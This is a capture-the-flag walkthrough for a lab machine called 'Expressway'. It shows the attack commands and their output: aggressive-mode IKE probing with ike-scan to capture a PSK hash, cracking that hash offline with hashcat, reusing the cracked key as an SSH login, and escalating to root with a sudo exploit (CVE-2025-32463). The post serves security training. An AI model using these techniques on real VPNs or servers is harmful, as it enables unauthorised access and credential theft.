+++
title = 'Expressway'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

**nmap** scan
![Expressway (Easy Linux).png](Expressway%20%28Easy%20Linux%29.png)

just 22 with latest ssh version - so maybe udp scan

![Expressway (Easy Linux)-1.png](Expressway%20%28Easy%20Linux%29-1.png)

See that port 500 is open - commonly used for Internet Key Exchange (IKE) protocol

from https://community.cisco.com/t5/security-knowledge-base/dead-peer-detection/ta-p/3111324
Dead Peer Detection (**DPD**) is a method that allows detection of unreachable Internet Key Exchange (IKE) peers. DPD is described in the informational [RFC 3706](http://tools.ietf.org/html/rfc3706 "http://tools.ietf.org/html/rfc3706"): "A Traffic-Based Method of Detecting Dead Internet Key Exchange (IKE) Peers" authored by G. Huang, S. Beaulieu, D. Rochefort.

This RFC describes DPD negotiation procedure and two new **ISAKMP NOTIFY** messages. Specifically, DPD is negotiated via an exchange of the DPD **ISAKMP Vendor ID** payload, which is sent in the ISAKMP MM messages 3 and 4 or ISAKMP AM messages 1 and 2. DPD Requests are sent as **ISAKMP R-U-THERE** messages and DPD Responses are sent as **ISAKMP R-U-THERE-ACK** messages.


IKE is part of IPsec suite to establish secure VPN tunnels

using ike-scan --aggressive
![Expressway (Easy Linux)-2.png](Expressway%20%28Easy%20Linux%29-2.png)
```
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.242.237  Aggressive Mode Handshake returned HDR=(CKY-R=a0b0213b53d2934d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.212 seconds (4.72 hosts/sec).  1 returned handshake; 0 returned notify
```

we see that there is a user
`ike` with email `ike@expressway.htb`

So, what is a PSK?

A PSK (Pre-Shared Key) is a secret key shared beforehand between the vpn client and the server. It is used in IKE for authenticating and establishing secure VPN tunnels. Both sides must have the same PSK to successfully complete the IKE handshake.
### How does PSK work in IKE?

- During the IKE handshake, the client and server prove knowledge of the PSK without sending it directly.
- In **Aggressive Mode**, some information is sent in cleartext, which leaks identities and allows offline attacks on the PSK.
- In **Main Mode**, the PSK is better protected, making offline cracking harder or impossible.

In the aggressive mode handshake, the handshake contains:
- Server and client cookies
- Security Association (SA) parameters
- Key Exchange payload
- Nonce values
- Identity payload (leaked in Aggressive Mode)
- A hash derived from the PSK and handshake data

We want to crack the hash offline.

```bash
# Capture handshake data
ike-scan --aggressive 10.129.242.237 > handshake.txt
```

### Why you can’t just take the “Hash(20 bytes)” from ike-scan output and crack it directly:

- The **"Hash(20 bytes)"** shown by ike-scan is **part of the IKE Aggressive Mode handshake payload**, specifically the AUTH payload hash.
- This hash is **not the raw PSK or a simple hash of the PSK**. Instead, it is a keyed hash (HMAC) computed using the PSK combined with multiple handshake values (nonces, cookies, identities, DH values).
- The hash depends on the **unknown PSK** and other handshake data, so you **cannot just crack that single hash value directly** without knowing the full handshake parameters and reconstructing the hash calculation process.

good resource for IKE pen testing - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/

![Expressway (Easy Linux)-4.png](Expressway%20%28Easy%20Linux%29-4.png)

```bash
ike-scan 10.129.242.237 -M -A -P --id=ike@expressway.htb

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.242.237  Aggressive Mode Handshake returned
        HDR=(CKY-R=91a72b59e48e2212)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
352bcc9ad50b0522f2055de0a3c95b31000922ee70985730b66b5e68b0fd2d001ef68f5baf86ba8f75a8de9e83c1564d3d494b49a7ed86a4cc936e5ac4e142bbf15fc31f99720157259a821682481e2c23cdf0e50c857208ae46fa850da2f3ffa925b0a755d147aa265f8e2ffb884881cb8f34a3a31f94479562c2dd93562256:29b142bab7208fd968b481feb4da5579103f4a8879c0c2f4c826df6384e40c3d74144e7c2dfb2788799d00a9abbf249b7baa0b6608094515f5b1a90d34c4295063dc67ebf775707fdcc98d10dedb658c17221518265aec4b71a1ea781f5495d2a0725dc206dd2921be22e1151bb42a6fb1d1ef7a4776f554c66fd9dc3fbd1461:91a72b59e48e2212:3d211d9881e1758b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a54131612798182f011368da715318a9d9adfc89:256f6cdb4d07f9abd7d56044a31265a9d3dae83496d1549eea47b9049324d8d7:39cf7f5fd7a5b6ac7b53ffda070d456548388fac
Ending ike-scan 1.9.6: 1 hosts scanned in 0.217 seconds (4.60 hosts/sec).  1 returned handshake; 0 returned notify

```

Note that we have to make --id= the correct value because the hash process involves the value of id - in aggressive mode we were able to get the id value and so we use that

### What is this?

- This is the **full handshake data** needed for offline PSK cracking.
- Each colon-separated field corresponds to a specific IKE handshake value:
    - `g_xr`, `g_xi`: Diffie-Hellman public keys (responder and initiator)
    - `cky_r`, `cky_i`: Cookies (responder and initiator)
    - `sai_b`: Security Association payload (binary)
    - `idir_b`: Initiator ID payload (binary)
    - `ni_b`, `nr_b`: Nonces (initiator and responder)
    - `hash_r`: The hash from the responder (the AUTH hash)

hash.txt file content
```
352bcc9ad50b0522f2055de0a3c95b31000922ee70985730b66b5e68b0fd2d001ef68f5baf86ba8f75a8de9e83c1564d3d494b49a7ed86a4cc936e5ac4e142bbf15fc31f99720157259a821682481e2c23cdf0e50c857208ae46fa850da2f3ffa925b0a755d147aa265f8e2ffb884881cb8f34a3a31f94479562c2dd93562256:29b142bab7208fd968b481feb4da5579103f4a8879c0c2f4c826df6384e40c3d74144e7c2dfb2788799d00a9abbf249b7baa0b6608094515f5b1a90d34c4295063dc67ebf775707fdcc98d10dedb658c17221518265aec4b71a1ea781f5495d2a0725dc206dd2921be22e1151bb42a6fb1d1ef7a4776f554c66fd9dc3fbd1461:91a72b59e48e2212:3d211d9881e1758b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a54131612798182f011368da715318a9d9adfc89:256f6cdb4d07f9abd7d56044a31265a9d3dae83496d1549eea47b9049324d8d7:39cf7f5fd7a5b6ac7b53ffda070d456548388fac
```

```bash
hashcat -m 5400 hash_psk.txt /usr/share/wordlists/rockyou.txt
# and we get a crack
hashcat -m 5400 hash_psk.txt --show
```

![Expressway (Easy Linux)-5.png](Expressway%20%28Easy%20Linux%29-5.png)

it cracks to `freakingrockstarontheroad`

This PSK would generally now be used to authenticate to the VPN/IPsec server - using a vpn client to connect

but trying it on ssh and it works

![Expressway (Easy Linux)-6.png](Expressway%20%28Easy%20Linux%29-6.png)
user.txt - `fc818b19372f2b83bc428dbb5f76fef0`

![Expressway (Easy Linux)-7.png](Expressway%20%28Easy%20Linux%29-7.png)
we see that we are part of a group `proxy`
`find / -group proxy 2>&1 | grep -v "Permission denied"`
2>&1 redirects to standard output so we can perform grep

we find something related to squid
![Expressway (Easy Linux)-8.png](Expressway%20%28Easy%20Linux%29-8.png)

  
"Squid" in the context of Linux refers to the ==**[Squid caching proxy server](https://www.google.com/search?q=Squid+caching+proxy+server&rlz=1C1GCEA_enAU1171AU1171&oq=what+is+squid+linux&gs_lcrp=EgZjaHJvbWUqDAgAEAAYFBiHAhiABDIMCAAQABgUGIcCGIAEMgcIARAAGIAEMgcIAhAAGIAEMgcIAxAAGIAEMgcIBBAAGIAEMggIBRAAGBYYHjIICAYQABgWGB4yCAgHEAAYFhgeMggICBAAGBYYHjIICAkQABgWGB7SAQgzMjIwajBqNKgCALACAQ&sourceid=chrome&ie=UTF-8&mstk=AUtExfCvD4q7hd2I6zhi05ppenMrblpPlmQ3rCWwsoCfUsIlqS-BW_d0tIBnfaDEiBvR0wofdlufBwD0-A-dEabrc_i3Bw3nEQcEmUZm5fjq566F427ilZ6uZ_V-LMir4sCZPn46vTlPx7zR9gJbT3D1iXMhzjPU6ImC0GTFi2hhYrBi2EYUOuY-DqMiDFn02sKXBFUsAljilwg-n54EQ70AtZ2MRYZlUcMMtvaTeGtnRe_hQnpg4jOEAboTmxRt_alEafI3Ec8vDw3tFQ6IyPgx41So&csui=3&ved=2ahUKEwio-ef0reyPAxVASmwGHe7QGssQgK4QegQIARAC)**, a high-performance software application used to store and serve frequently requested web content from a local cache==. This process reduces network traffic, improves response times for users, and enhances network security by filtering content. Squid supports protocols like HTTP, HTTPS, and FTP, making it a versatile tool for optimizing web delivery in networks of all sizes.

process is being run:
![Expressway (Easy Linux)-9.png](Expressway%20%28Easy%20Linux%29-9.png)

I downloaded the log and cache files in /var/log/squid

running linpeas...
```
╔══════════╣ Analyzing Htpasswd Files (limit 70)       
-rw-r--r-- 1 root root 47 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
-rw-r--r-- 1 root root 47 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
-rw-r--r-- 1 root root 117 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04           
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
-rw-r--r-- 1 root root 62 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30     
4105bbb04  
```
![Expressway (Easy Linux)-10.png](Expressway%20%28Easy%20Linux%29-10.png)

Stupid mistake time - I was using an older version of linpeas
you know what's new that wont get shown - new vulnerabilities

running a newer version of linpeas, you can see that the sudo version is red and searching for an exploit on sudo version `1.9.17`
we see a new vulnerability `CVE-2025-32463` chwoot

running the script on the box, we get root
![Expressway (Easy Linux)-11.png](Expressway%20%28Easy%20Linux%29-11.png)
